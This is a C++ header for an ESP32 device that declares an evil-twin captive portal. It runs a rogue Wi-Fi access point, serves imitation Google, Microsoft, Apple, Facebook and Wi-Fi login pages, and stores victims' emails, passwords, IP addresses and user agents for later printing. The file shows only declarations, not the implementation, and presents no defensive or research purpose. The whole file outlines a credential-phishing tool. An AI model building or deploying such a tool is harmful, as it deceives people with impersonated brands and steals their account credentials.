#ifndef CAPTIVE_PORTAL_H
#define CAPTIVE_PORTAL_H

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>

class CaptivePortal {
private:
  struct ClientSession {
    String id;
    String ip;
    unsigned long firstSeen;
    unsigned long lastActivity;
    bool submittedCredentials;
    String userAgent;
    ClientSession()
      : ip(""), firstSeen(0), lastActivity(0), submittedCredentials(false) {}
  };

  struct Credential {
    String timestamp;
    String clientId;
    String clientIP;
    String userAgent;
    String portalType;
    String ssid;
    String email;
    String password;
    String additionalInfo;
  };

  DNSServer dnsServer;
  WebServer server;
  Preferences preferences;

  IPAddress apIP;
  String apSSID;
  String apPassword;
  String redirectURL;
  String portalType;

  bool portalRunning;
  unsigned long portalStartTime;
  unsigned long credentialsCaptured;

  ClientSession clients[10];
  Credential capturedCredentials[50];
  int credentialCount;

  // Private method declarations
  String generateClientId();
  String getTimestamp();
  String getClientIP();
  String getUserAgent();
  ClientSession* findOrCreateClient(const String& ip);
  void cleanupOldClients();
  void saveCredential(const String& email, const String& password, ClientSession* client);
  void saveToPreferences();
  void loadFromPreferences();
  void handleRoot();
  void handleLogin();
  void handleCapture();
  void handleNotFound();
  const char* getGoogleLoginPage();
  const char* getWifiLoginPage();
  const char* getMicrosoftLoginPage();
  const char* getAppleLoginPage();
  const char* getFacebookLoginPage();

public:
  CaptivePortal();
  bool startPortal(const String& ssid, const String& password, const String& type = "wifi");
  void stopPortal();
  void update();
  bool isRunning();
  void printStatus();
  void printCredentials();
  void clearCredentials();
  String getSSID();
  String getPortalType();
  unsigned long getCredentialsCaptured();
  int getClientCount();
};

// Global instance
extern CaptivePortal portalManager;

#endif